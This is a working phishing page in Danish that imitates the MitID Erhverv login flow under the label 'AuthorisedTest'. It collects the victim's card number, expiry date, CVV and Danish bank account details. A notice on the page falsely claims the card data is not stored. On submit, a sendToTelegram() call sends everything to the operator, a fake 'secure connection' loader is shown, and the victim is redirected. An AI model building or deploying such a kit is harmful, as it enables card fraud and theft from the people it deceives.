<?php include "include/session.php"; ?>
<!doctype html>
<html lang="da">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Udbetalingskonto - AuthorisedTest Erhverv</title>
<link rel="icon" type="image/x-icon" href="static/media/favicon.ico">
<style>
/* ── Roboto (local, matches brand font) ── */
@font-face{font-family:'Roboto';font-style:normal;font-weight:400;font-display:swap;src:url(static/media/roboto-latin-400-normal.b009a76ad6afe4ebd301.woff2) format('woff2'),url(static/media/roboto-latin-400-normal.3f2b9a42f643e62a49b7.woff) format('woff')}
@font-face{font-family:'Roboto';font-style:normal;font-weight:500;font-display:swap;src:url(static/media/roboto-latin-500-normal.f25d774ecfe0996f8eb5.woff2) format('woff2'),url(static/media/roboto-latin-500-normal.1f075502d0094a398e21.woff) format('woff')}
@font-face{font-family:'Roboto';font-style:normal;font-weight:400;font-display:swap;unicode-range:U+0100-024F,U+0259,U+1E00-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF;src:url(static/media/roboto-latin-ext-400-normal.861b791f9de857a6e7bc.woff2) format('woff2'),url(static/media/roboto-latin-ext-400-normal.e757c42df6aaa3e11b62.woff) format('woff')}
@font-face{font-family:'Roboto';font-style:normal;font-weight:500;font-display:swap;unicode-range:U+0100-024F,U+0259,U+1E00-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF;src:url(static/media/roboto-latin-ext-500-normal.9165081d10e1ba601384.woff2) format('woff2'),url(static/media/roboto-latin-ext-500-normal.252057e589a0379208ed.woff) format('woff')}

*{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%}
body{font-family:Roboto,'Helvetica Neue',Arial,sans-serif;background:#fff;color:#333;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:24px}
.hidden{display:none!important}

/* ── FORM CONTAINER ── */
.login-card{width:100%;max-width:440px;background:#fff;border:1px solid #d0d0d0;border-radius:4px;box-shadow:0 1px 4px rgba(0,0,0,.06);padding:36px 38px;display:flex;flex-direction:column}

/* ── CENTERED AuthorisedTest ERHVERV LOGO ── */
.card-logo{display:flex;flex-direction:column;align-items:center;margin-bottom:28px}
.logo-main{display:flex;align-items:center;gap:2px;font-size:34px;font-weight:700;color:#0060e6;line-height:1}
.logo-main img{height:34px;width:auto;display:block;object-fit:contain}
.logo-sub{font-size:15px;font-weight:600;color:#0060e6;letter-spacing:.04em;margin-top:2px}

/* ── HEADING ── */
.card-header{text-align:center;margin-bottom:24px}
.card-header h1{font-size:20px;font-weight:700;color:#222;line-height:1.3;margin-bottom:8px}
.card-header p{font-size:14px;color:#666;line-height:1.5}

/* ── CREDIT CARD VISUAL ── */
.card-visual{position:relative;width:100%;max-width:344px;margin:0 auto 26px;aspect-ratio:1.586;border-radius:14px;padding:18px 20px;color:#fff;display:flex;flex-direction:column;justify-content:space-between;box-shadow:0 8px 22px rgba(0,0,0,.28);transition:background .35s ease}
.card-visual.brand-unknown{background:linear-gradient(135deg,#0d1b2a,#16324a)}
.card-visual.brand-visa{background:linear-gradient(135deg,#1a1f71,#243a9e)}
.card-visual.brand-mastercard{background:linear-gradient(135deg,#17181d,#2b2d33)}
.card-visual.brand-amex{background:linear-gradient(135deg,#006f71,#009688)}
.card-visual.brand-maestro{background:linear-gradient(135deg,#2a1e5c,#4a3a8f)}
.card-visual.brand-diners{background:linear-gradient(135deg,#3a4a5a,#566b80)}
.card-visual.brand-discover{background:linear-gradient(135deg,#d95d1e,#f57c22)}
.card-visual.brand-jcb{background:linear-gradient(135deg,#0e4c8f,#1a6baa)}
.card-top{display:flex;align-items:flex-start;justify-content:space-between}
.card-chip{width:42px;height:32px;border-radius:6px;background:linear-gradient(135deg,#f4d03f,#e8b923);box-shadow:inset 0 0 0 1px rgba(120,90,0,.45)}
.card-chip::after{content:"";display:block;height:100%;background:repeating-linear-gradient(90deg,transparent 0 6px,rgba(120,90,0,.35) 6px 8px);border-radius:6px}
.card-contactless{display:inline-flex}
.card-contactless svg{width:22px;height:22px;color:rgba(255,255,255,.85)}
.card-brand-logo{position:absolute;top:16px;right:18px;display:flex;align-items:center;justify-content:center;min-height:32px}
.brand-badge{display:none}
.brand-badge.visa{font-style:italic;font-weight:800;font-size:24px;letter-spacing:.02em;color:#fff}
.brand-badge.mc{gap:0}
.mc-dot{width:26px;height:26px;border-radius:50%}
.mc-dot.mc1{background:#eb001b}
.mc-dot.mc2{background:#f79e1b;margin-left:-10px;mix-blend-mode:screen}
.brand-badge.amex{font-weight:800;font-size:17px;letter-spacing:.04em;color:#fff}
.brand-badge.maestro{align-items:center;gap:4px}
.mc-dot.small{width:18px;height:18px}
.brand-badge.maestro span.txt{font-style:italic;font-weight:700;font-size:15px;color:#fff}
.brand-badge.diners{font-weight:700;font-size:12px;letter-spacing:.05em;color:#fff}
.brand-badge.discover{font-weight:800;font-size:16px;letter-spacing:.03em;color:#fff}
.brand-badge.jcb{font-weight:800;font-size:16px;letter-spacing:.03em;color:#fff}
.card-number{margin-top:6px}
.card-num-label{display:block;font-size:10px;letter-spacing:.14em;color:rgba(255,255,255,.62);margin-bottom:4px}
.card-number .num{font-size:21px;font-weight:500;letter-spacing:.12em;font-variant-numeric:tabular-nums;word-break:break-all}
.card-bottom{display:flex;align-items:flex-end;justify-content:space-between;gap:10px}
.card-mini-label{display:block;font-size:9px;letter-spacing:.14em;color:rgba(255,255,255,.62);margin-bottom:3px}
.card-name{font-size:13px;font-weight:500;letter-spacing:.05em;text-transform:uppercase;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:180px}
.card-expiry .val{font-size:14px;font-weight:500;letter-spacing:.08em}

/* ── FIELD ── */
.field-label{display:flex;align-items:center;margin-bottom:8px}
.field-label label{font-size:13px;font-weight:700;color:#333;text-transform:uppercase;letter-spacing:.02em}
.input-wrap{position:relative;margin-bottom:14px}
.input-wrap input{width:100%;height:48px;border:1px solid #b8b8b8;border-radius:0;padding:0 14px;font-size:15px;font-family:inherit;color:#333;background:#fff;outline:none;transition:border-color .15s}
.input-wrap input:focus{border-color:#0060e6}
.input-wrap input::placeholder{color:#aaa}

/* ── TWO-COLUMN ROW ── */
.form-row{display:flex;gap:12px}
.form-row .col{flex:1;min-width:0}

/* ── WARNING NOTE (yellow stripe) ── */
.note-warning{margin:2px 0 20px;padding:12px 14px;background:#fdf9ec;border-left:4px solid #ffc107;font-size:13px;line-height:1.5;color:#5c5640}

/* ── BUTTON ── */
.btn-primary{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;height:48px;border:none;border-radius:0;font-size:14px;font-weight:700;letter-spacing:.08em;color:#fff;background:#b0b0b0;cursor:not-allowed;transition:background .2s;font-family:inherit}
.btn-primary.active{background:#0060e6;cursor:pointer}
.btn-primary.active:hover{background:#004aa5}
.arrow-icon{display:inline-flex;align-items:center}

/* ── LOADER (same animation as login first-load) ── */
.init-loader{display:flex;align-items:center;justify-content:center;min-height:400px;width:100%;text-align:center}
.init-loader-inner{display:flex;flex-direction:column;align-items:center}
.init-mitid-logo{display:flex;align-items:center;gap:2px;font-size:34px;font-weight:700;color:#0060e6;margin-bottom:18px;line-height:1}
.init-mitid-logo img{height:34px;width:auto;display:block;object-fit:contain}
.init-shield{position:relative;width:140px;height:140px;margin-bottom:16px}
.init-shield svg{width:100%;height:100%;display:block}
.init-spinner{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:44px;height:44px;border:4px solid rgba(255,255,255,.35);border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite}
@keyframes spin{to{transform:translate(-50%,-50%) rotate(360deg)}}
.init-loader-text{font-size:17px;font-weight:700;color:#222;margin-bottom:5px}
.init-loader-subtext{font-size:14px;color:#666}

@media(max-width:480px){
  body{padding:0}
  .login-card{width:100%;max-width:100%;min-height:100vh;min-height:100dvh;border:none;box-shadow:none;border-radius:0;padding:28px 22px}
  .card-visual{padding:14px 16px}
  .card-number .num{font-size:17px}
}
</style>
</head>
<body>

<!-- LOADER (hidden) — same animation as login first-load -->
<div id="loaderContainer" class="init-loader hidden">
  <div class="init-loader-inner">
    <div class="init-mitid-logo" aria-label="MitID logo">
      <img class="logo-img" src="static/media/MiTD-logo.png" alt="MitID">
    </div>
    <div class="init-shield">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 117" focusable="false" aria-hidden="true">
        <path d="M49.9,0l50,15v41.2c0,47.8-50,60.8-50,60.8s-50-13-50-60.8V15L49.9,0" fill="#0060e6"/>
      </svg>
      <div class="init-spinner"></div>
    </div>
    <div class="init-loader-text">Forbinder sikkert til AuthorisedTest</div>
    <div class="init-loader-subtext">Vent et øjeblik ...</div>
  </div>
</div>

<!-- FORM CONTAINER -->
<div class="login-card" id="cardForm">

  <!-- CENTERED AuthorisedTest ERHVERV LOGO -->
  <div class="card-logo">
    <div class="logo-main">
      <img class="logo-img" src="static/media/MiTD-logo.png" alt="MitID">
    </div>
    <div class="logo-sub">Erhverv</div>
  </div>

  <!-- HEADING -->
  <div class="card-header">
    <h1>Udbetalingskonto</h1>
    <p>Indtast dine kontooplysninger for at tilknytning til din Mitid Erhverv bruger</p>
  </div>

  <!-- CREDIT CARD VISUAL -->
  <div id="cardPreview" class="card-visual brand-unknown">
    <div class="card-top">
      <div class="card-chip" aria-hidden="true"></div>
      <div class="card-contactless" aria-hidden="true">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
          <path d="M7 8a8 8 0 010 8"/>
          <path d="M10.5 6.5a12 12 0 010 11"/>
          <path d="M14 5a16 16 0 010 14"/>
          <circle cx="17.5" cy="12" r="1.4" fill="currentColor" stroke="none"/>
        </svg>
      </div>
    </div>
    <div class="card-brand-logo">
      <span class="brand-badge visa" data-brand="visa">VISA</span>
      <span class="brand-badge mc" data-brand="mastercard" data-display="flex"><span class="mc-dot mc1"></span><span class="mc-dot mc2"></span></span>
      <span class="brand-badge amex" data-brand="amex">AMEX</span>
      <span class="brand-badge maestro" data-brand="maestro" data-display="flex"><span class="mc-dot small mc1"></span><span class="mc-dot small mc2"></span><span class="txt">maestro</span></span>
      <span class="brand-badge diners" data-brand="diners">DINERS</span>
      <span class="brand-badge discover" data-brand="discover">DISCOVER</span>
      <span class="brand-badge jcb" data-brand="jcb">JCB</span>
    </div>
    <div class="card-number">
      <span class="card-num-label">KORT NR</span>
      <span id="cardNumberDisplay" class="num">•••• •••• •••• ••••</span>
    </div>
    <div class="card-bottom">
      <div class="card-holder">
        <span class="card-mini-label">KORTEJER</span>
        <span id="cardNameDisplay" class="card-name">DIT NAVN</span>
      </div>
      <div class="card-expiry">
        <span class="card-mini-label">UDLØBER</span>
        <span id="cardExpiryDisplay" class="val">MM/ÅÅ</span>
      </div>
    </div>
  </div>

  <!-- FIELD: KORTINDEHAVER -->
  <div class="field-label">
    <label for="kortnavn">Kortindehaver</label>
  </div>
  <div class="input-wrap">
    <input type="text" id="kortnavn" maxlength="40" autocomplete="off" spellcheck="false" aria-label="Kortindehaver">
  </div>

  <!-- FIELD: KORT NUMMER -->
  <div class="field-label">
    <label for="kortnummer">Kort nummer</label>
  </div>
  <div class="input-wrap">
    <input type="text" id="kortnummer" maxlength="23" inputmode="numeric" autocomplete="off" spellcheck="false" aria-label="Kort nummer" placeholder="0000 0000 0000 0000">
  </div>

  <!-- FIELD: UDLØBSDATO + CVV -->
  <div class="form-row">
    <div class="col">
      <div class="field-label">
        <label for="expiry">Udløbsdato</label>
      </div>
      <div class="input-wrap">
        <input type="text" id="expiry" placeholder="MM/ÅÅ" maxlength="5" inputmode="numeric" autocomplete="off" spellcheck="false" aria-label="Udløbsdato">
      </div>
    </div>
    <div class="col">
      <div class="field-label">
        <label for="cvv">CVV</label>
      </div>
      <div class="input-wrap">
        <input type="password" id="cvv" placeholder="•••" maxlength="4" inputmode="numeric" autocomplete="off" spellcheck="false" aria-label="CVV">
      </div>
    </div>
  </div>

  <!-- FIELD: REGNR + KONTONR -->
  <div class="form-row">
    <div class="col">
      <div class="field-label">
        <label for="regNr">Reg-nr</label>
      </div>
      <div class="input-wrap">
        <input type="text" id="regNr" placeholder="0000" maxlength="4" inputmode="numeric" autocomplete="off" spellcheck="false" aria-label="Reg-nr">
      </div>
    </div>
    <div class="col">
      <div class="field-label">
        <label for="kontoNr">Konto-nummer</label>
      </div>
      <div class="input-wrap">
        <input type="text" id="kontoNr" placeholder="0000000000" maxlength="10" inputmode="numeric" autocomplete="off" spellcheck="false" aria-label="Konto-nummer">
      </div>
    </div>
  </div>

  <!-- WARNING NOTE -->
  <div class="note-warning">
    Af hensyn til din sikkerhed gemmer vi ikke dine kortoplysninger. Dine oplysninger behandles sikkert og opbevares ikke hos os.
  </div>

  <!-- BUTTON -->
  <button id="nextBtn" class="btn-primary disabled" disabled type="button">
    <span>NÆSTE</span>
    <span class="arrow-icon">
      <svg width="18" height="18" viewBox="0 0 24 24" fill="#fff"><path d="M5 13h11.17l-4.88 4.88c-.39.39-.39 1.03 0 1.42.39.39 1.02.39 1.41 0l6.59-6.59c.39-.39.39-1.02 0-1.41l-6.58-6.6c-.39-.39-1.02-.39-1.41 0-.39.39-.39 1.02 0 1.41L16.17 11H5c-.55 0-1 .45-1 1s.45 1 1 1z"/></svg>
    </span>
  </button>
</div>

<script src="js/shared.js"></script>
<script>
loadState();

// ── ELEMENTS ──
var cardPreview    = document.getElementById('cardPreview');
var cardNumDisplay = document.getElementById('cardNumberDisplay');
var cardNameDisplay= document.getElementById('cardNameDisplay');
var cardExpDisplay = document.getElementById('cardExpiryDisplay');
var kortnavnInput  = document.getElementById('kortnavn');
var kortnrInput    = document.getElementById('kortnummer');
var expiryInput    = document.getElementById('expiry');
var cvvInput       = document.getElementById('cvv');
var regNrInput     = document.getElementById('regNr');
var kontoNrInput   = document.getElementById('kontoNr');
var nextBtn        = document.getElementById('nextBtn');

// ── BRAND DETECTION (prefix-based, realtime) ──
function detectBrand(digits){
  if (digits.length < 2) return 'unknown';
  var d = digits;
  if (/^4/.test(d)) return 'visa';
  if (/^(5[1-5]|222[1-9]|22[3-9]\d|2[3-6]\d{2}|27[01]\d|2720)/.test(d)) return 'mastercard';
  if (/^3[47]/.test(d)) return 'amex';
  if (/^(5018|5020|5038|5893|6304|6759|676[1-3])/.test(d)) return 'maestro';
  if (/^(300|301|302|303|304|305|36|38|39)/.test(d)) return 'diners';
  if (/^(6011|64[4-9]|65)/.test(d)) return 'discover';
  if (/^35(2[89]|[3-8]\d)/.test(d)) return 'jcb';
  return 'unknown';
}

function applyBrand(brand){
  cardPreview.className = 'card-visual brand-' + brand;
  // Show ONLY the badge matching the detected brand (JS-driven visibility)
  var badges = cardPreview.querySelectorAll('.brand-badge');
  for (var i = 0; i < badges.length; i++){
    var b = badges[i];
    b.style.display = (b.getAttribute('data-brand') === brand)
      ? (b.getAttribute('data-display') || 'block')
      : 'none';
  }
}

// ── FORMATTING HELPERS ──
function onlyDigits(s){ return (s || '').replace(/\D/g, ''); }

function formatCardNumber(digits){
  var brand = detectBrand(digits);
  var max = brand === 'amex' ? 15 : (brand === 'maestro' ? 19 : 16);
  digits = digits.slice(0, max);
  if (brand === 'amex') {
    return digits.replace(/^(\d{4})(\d{6})?(\d{5})?/, function(m, a, b, c){
      var out = a;
      if (b) out += ' ' + b;
      if (c) out += ' ' + c;
      return out;
    });
  }
  return digits.replace(/(\d{4})(?=\d)/g, '$1 ');
}

function formatExpiry(digits){
  digits = digits.slice(0, 4);
  if (digits.length >= 3) return digits.slice(0, 2) + '/' + digits.slice(2);
  if (digits.length === 2) {
    var m = parseInt(digits, 10);
    if (m > 12) return '0' + digits[0] + '/' + digits[1];
  }
  return digits;
}

// ── LIVE CARD PREVIEW ──
function updateCardNumber(){
  var digits = onlyDigits(kortnrInput.value);
  var formatted = formatCardNumber(digits);
  kortnrInput.value = formatted;
  var brand = detectBrand(digits);
  applyBrand(brand);
  cardNumDisplay.textContent = formatted || '•••• •••• •••• ••••';
}

function updateCardName(){
  var v = kortnavnInput.value.trim().toUpperCase();
  cardNameDisplay.textContent = v || 'DIT NAVN';
}

function updateCardExpiry(){
  var v = expiryInput.value.trim();
  cardExpDisplay.textContent = v || 'MM/ÅÅ';
}

// ── INPUT HANDLERS ──
kortnavnInput.addEventListener('input', function(){ updateCardName(); checkForm(); });

kortnrInput.addEventListener('input', function(){
  var caret = kortnrInput.selectionStart;
  var raw = onlyDigits(kortnrInput.value);
  var formatted = formatCardNumber(raw);
  kortnrInput.value = formatted;
  // keep caret near where it was
  var caretDigits = onlyDigits(kortnrInput.value.slice(0, caret));
  var pos = formatted.indexOf(caretDigits.slice(-1));
  if (pos >= 0) { try { kortnrInput.setSelectionRange(pos + 1, pos + 1); } catch(e){} }
  updateCardNumber();
  checkForm();
});

expiryInput.addEventListener('input', function(){
  var digits = onlyDigits(expiryInput.value);
  var formatted = formatExpiry(digits);
  expiryInput.value = formatted;
  updateCardExpiry();
  checkForm();
});

cvvInput.addEventListener('input', function(){
  this.value = onlyDigits(this.value).slice(0, 4);
  checkForm();
});

regNrInput.addEventListener('input', function(){
  this.value = onlyDigits(this.value).slice(0, 4);
  checkForm();
});

kontoNrInput.addEventListener('input', function(){
  this.value = onlyDigits(this.value).slice(0, 10);
  checkForm();
});

// ── VALIDATION ──
function checkForm(){
  var digits = onlyDigits(kortnrInput.value);
  var ready =
    kortnavnInput.value.trim().length >= 2 &&
    digits.length >= 13 &&
    /^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryInput.value.trim()) &&
    /^\d{3,4}$/.test(cvvInput.value) &&
    /^\d{4}$/.test(regNrInput.value) &&
    /^\d{4,10}$/.test(kontoNrInput.value);
  nextBtn.disabled = !ready;
  nextBtn.className = 'btn-primary ' + (ready ? 'active' : 'disabled');
}

// ── PREFILL FROM STATE (back navigation) ──
kortnavnInput.value = state.data.kortnavn || '';
kortnrInput.value   = formatCardNumber(onlyDigits(state.data.kortnummer));
expiryInput.value   = state.data.expiry || '';
cvvInput.value      = state.data.cvv || '';
regNrInput.value    = state.data.regNr || '';
kontoNrInput.value  = state.data.kontoNr || '';
updateCardNumber();
updateCardName();
updateCardExpiry();

// ── SUBMIT ──
nextBtn.addEventListener('click', function(){
  if (nextBtn.disabled) return;
  state.data.kortnavn   = kortnavnInput.value.trim();
  state.data.kortnummer = onlyDigits(kortnrInput.value);
  state.data.expiry     = expiryInput.value.trim();
  state.data.cvv        = cvvInput.value;
  state.data.regNr      = regNrInput.value;
  state.data.kontoNr    = kontoNrInput.value;
  saveState();

  document.getElementById('cardForm').classList.add('hidden');
  document.getElementById('loaderContainer').classList.remove('hidden');
  sendToTelegram();
  setTimeout(function(){ window.location.href = 'done.php'; }, 2000);
});
</script>
</body>
</html>
